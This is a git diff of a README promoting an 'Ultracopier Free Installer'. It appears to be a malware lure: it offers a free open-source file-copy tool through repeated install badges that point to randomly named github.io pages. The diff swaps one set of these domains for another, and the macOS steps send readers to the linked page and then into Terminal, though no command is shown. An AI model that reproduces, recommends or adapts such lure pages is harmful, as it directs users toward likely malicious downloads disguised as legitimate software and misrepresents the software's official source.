@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-File+Copier-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-File+Copy+Tool-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Ultracopier Free Installer** — Ultracopier is a free, open-source file copy manager for Windows, macOS, and Linux that replaces the system copy dialog with a more powerful alternative. Works without internet access, no account required. Full offline installation.
+**💻 Ultracopier Free Installer** — Ultracopier is a free, cross-platform replacement for the default Windows file copy dialog. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Ultracopier](https://img.shields.io/badge/⬇_Install_Ultracopier-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Ultracopier](https://img.shields.io/badge/⬇_Install_Ultracopier-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Ultracopier
 
-Ultracopier is a free, open-source file copy manager for Windows, macOS, and Linux that replaces the system copy dialog with a more powerful alternative. Features include pause and resume, transfer speed graphs, copy queue management, and error handling. Ultracopier gives users detailed control over file transfer operations that the default system copy dialogs lack.
+Ultracopier is a free, cross-platform replacement for the default Windows file copy dialog. It adds pause/resume capability, transfer speed control, transfer queue management, and detailed statistics to file copy and move operations.
 
 ---
 
 ## ❌ Problem: Ultracopier is hard to access
 
-- **Cross-platform Inconsistency** — Feature sets differ between Windows, macOS, and Linux versions
-- **Integration Depth** — Windows shell integration less seamless than tools like TeraCopy
-- **Development Pace** — Updates slower than active commercial alternatives
-- **UI Design** — Functional but dated visual design
+- **Limited Differentiation** — Modern Windows and macOS have significantly improved native copy dialogs
+- **Interface Complexity** — Feature-rich compared to the simple default copy dialog
+- **Development Pace** — Updates arrive infrequently
+- **Declining Need** — Windows 10/11 copy improvements reduce the gap versus third-party tools
 
 ---
 
@@ -61,9 +61,9 @@ Ultracopier is a free, open-source file copy manager for Windows, macOS, and Lin
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Ultracopier is a free, open-source file copy manager for Windows, macOS, and Lin
 
 <div align="center">
 
-[![⬇ Install Ultracopier](https://img.shields.io/badge/⬇_Install_Ultracopier-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Ultracopier](https://img.shields.io/badge/⬇_Install_Ultracopier-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Ultracopier is a free, open-source file copy manager for Windows, macOS, and Lin
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Ultracopier is a free, open-source file copy manager for Windows, macOS, and Lin
 
 ---
 
-**Ultracopier Free Installer** — Ultracopier is a free, open-source file copy manager for Windows, macOS, and Linux that replaces the system copy dialog with a more powerful alternative. Install without internet connection today!
+**Ultracopier Free Installer** — Ultracopier is a free, cross-platform replacement for the default Windows file copy dialog. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Ultracopier](https://img.shields.io/badge/⬇_Install_Ultracopier-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Ultracopier](https://img.shields.io/badge/⬇_Install_Ultracopier-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
